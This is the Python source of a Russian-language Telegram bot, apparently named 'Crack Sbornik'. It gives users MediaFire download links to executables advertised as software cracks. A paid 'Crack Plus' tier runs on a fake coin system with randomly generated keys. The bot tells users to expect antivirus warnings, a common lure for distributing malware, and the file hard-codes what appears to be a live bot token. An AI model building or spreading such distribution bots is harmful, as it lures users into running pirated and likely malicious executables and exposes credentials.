import os
import time
import random
import string
from flask import Flask, request
import telebot
from telebot import types

TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ⚠️ ЗАМЕНИ
ADMIN_ID = 7859226148  # ⚠️ ЗАМЕНИ

SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
IMAGE_URL = "https://i.ibb.co/YBXZt30f/ggdoksraz.png"
CRACK_PLUS_LINK = "https://www.mediafire.com/file/fh6v3l9v27jh4g7/crack_plus.exe/file"
CRACK_PLUS_PRICE = 2500

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

users = set()
coins = {}
blacklist = set()
waiting_report = {}
last_use = {}
download_count = 0

COINS_FILE = "coins.txt"
BLACKLIST_FILE = "blacklist.txt"

def load_coins():
    global coins
    if os.path.exists(COINS_FILE):
        with open(COINS_FILE, 'r') as f:
            for line in f:
                if '|' in line:
                    uid, val = line.strip().split('|')
                    coins[int(uid)] = int(val)

def save_coins():
    with open(COINS_FILE, 'w') as f:
        for uid, val in coins.items():
            f.write(f"{uid}|{val}\n")

def load_blacklist():
    global blacklist
    if os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'r') as f:
            blacklist = set(int(l.strip()) for l in f if l.strip())

def save_blacklist():
    with open(BLACKLIST_FILE, 'w') as f:
        for uid in blacklist:
            f.write(f"{uid}\n")

def is_banned(uid): return uid in blacklist
def is_admin(uid): return uid == ADMIN_ID
def get_coins(uid): return coins.get(uid, 0)
def add_coins(uid, amt): coins[uid] = get_coins(uid) + amt; save_coins()
def remove_coins(uid, amt):
    if get_coins(uid) >= amt:
        coins[uid] -= amt
        save_coins()
        return True
    return False

def check_cd(uid):
    now = time.time()
    if uid in last_use and now - last_use[uid] < 5:
        return int(5 - (now - last_use[uid]))
    return 0
def update_cd(uid): last_use[uid] = time.time()

def gen_key():
    return '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(4))

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    if is_banned(uid):
        bot.send_message(uid, "❌ Вы забанены!")
        return
    users.add(uid)
    add_coins(uid, 10)
    bot.send_message(uid, f"💰 +10 монет! Баланс: {get_coins(uid)}")

    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("📥 Скачать софт", callback_data="download"),
        types.InlineKeyboardButton("🎯 Подробнее", callback_data="more"),
        types.InlineKeyboardButton("👥 Поделиться", callback_data="share"),
        types.InlineKeyboardButton("📢 Репорт", callback_data="report"),
        types.InlineKeyboardButton("💰 Баланс", callback_data="balance"),
        types.InlineKeyboardButton("🌐 Crack Plus", callback_data="crack_plus")
    )
    bot.send_message(uid, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=kb)

@bot.message_handler(commands=['buy'])
def buy(m):
    uid = m.from_user.id
    if is_banned(uid):
        bot.send_message(uid, "❌ Вы забанены!")
        return
    if get_coins(uid) >= CRACK_PLUS_PRICE:
        remove_coins(uid, CRACK_PLUS_PRICE)
        bot.send_message(uid, f"👑 **CRACK PLUS АКТИВИРОВАН!**\n\n🔗 {CRACK_PLUS_LINK}\n\n🔑 Ключ: `{gen_key()}`\n💰 Остаток: {get_coins(uid)}", parse_mode="Markdown")
    else:
        bot.send_message(uid, f"❌ Нужно {CRACK_PLUS_PRICE} монет! У вас {get_coins(uid)}")

@bot.message_handler(commands=['admin'])
def admin(m):
    if not is_admin(m.from_user.id):
        return
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        types.InlineKeyboardButton("💰 Выдать монеты", callback_data="admin_give"),
        types.InlineKeyboardButton("🚫 Забанить", callback_data="admin_ban"),
        types.InlineKeyboardButton("✅ Разбанить", callback_data="admin_unban")
    )
    bot.send_message(m.chat.id, "🔧 Админ-панель", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: True)
def handle(call):
    uid = call.from_user.id
    if is_banned(uid):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
        return

    if call.data == "download":
        if check_cd(uid): bot.answer_callback_query(call.id, f"⏳ {check_cd(uid)} сек!", True); return
        update_cd(uid)
        global download_count
        download_count += 1
        bot.answer_callback_query(call.id, "✅ Ссылка отправлена!")
        bot.send_message(uid, f"🔗 {SOFT_LINK}")

    elif call.data == "more":
        if check_cd(uid): bot.answer_callback_query(call.id, f"⏳ {check_cd(uid)} сек!", True); return
        update_cd(uid)
        bot.answer_callback_query(call.id, "📸")
        bot.send_photo(uid, IMAGE_URL, caption="☢️ антивирус может ругаться")

    elif call.data == "share":
        bot.answer_callback_query(call.id)
        bot.send_message(uid, f"👥 Поделиться:\nhttps://t.me/{bot.get_me().username}")

    elif call.data == "balance":
        bot.answer_callback_query(call.id)
        bot.send_message(uid, f"💰 Баланс: {get_coins(uid)} монет")

    elif call.data == "crack_plus":
        bot.answer_callback_query(call.id)
        bot.send_message(uid, "🌐 **Crack Plus**\n\nНапишите /buy чтобы купить!\n/start дает +10 монет!\nCrack Plus дает лучшую оптимизацию и больше функций!", parse_mode="Markdown")

    elif call.data == "admin_stats" and is_admin(uid):
        bot.answer_callback_query(call.id)
        bot.send_message(uid, f"📊 Статистика:\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")

    elif call.data == "admin_give" and is_admin(uid):
        bot.answer_callback_query(call.id)
        msg = bot.send_message(uid, "💰 Введите: ID количество (пример: 123456789 500)")
        bot.register_next_step_handler(msg, lambda m: give_coins(m))

    elif call.data == "admin_ban" and is_admin(uid):
        bot.answer_callback_query(call.id)
        msg = bot.send_message(uid, "🚫 Введите ID для бана:")
        bot.register_next_step_handler(msg, ban_user)

    elif call.data == "admin_unban" and is_admin(uid):
        bot.answer_callback_query(call.id)
        msg = bot.send_message(uid, "✅ Введите ID для разбана:")
        bot.register_next_step_handler(msg, unban_user)

def give_coins(m):
    try:
        uid, amt = map(int, m.text.split())
        add_coins(uid, amt)
        bot.send_message(m.chat.id, f"✅ Выдано {amt} монет пользователю {uid}")
    except:
        bot.send_message(m.chat.id, "❌ Ошибка! Пример: 123456789 500")

def ban_user(m):
    try:
        uid = int(m.text.strip())
        if uid == ADMIN_ID:
            bot.send_message(m.chat.id, "❌ Нельзя забанить админа!")
            return
        blacklist.add(uid)
        save_blacklist()
        bot.send_message(m.chat.id, f"✅ Пользователь {uid} забанен")
    except:
        bot.send_message(m.chat.id, "❌ Ошибка!")

def unban_user(m):
    try:
        uid = int(m.text.strip())
        if uid in blacklist:
            blacklist.remove(uid)
            save_blacklist()
            bot.send_message(m.chat.id, f"✅ Пользователь {uid} разбанен")
        else:
            bot.send_message(m.chat.id, "❌ Не в ЧС")
    except:
        bot.send_message(m.chat.id, "❌ Ошибка!")

@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        bot.process_new_updates([telebot.types.Update.de_json(request.get_data().decode('utf-8'))])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/')
def index():
    return "Bot is running!"

if __name__ == "__main__":
    load_coins()
    load_blacklist()
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-x4tg.onrender.com')}/{TOKEN}")
    print("✅ Бот запущен")
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
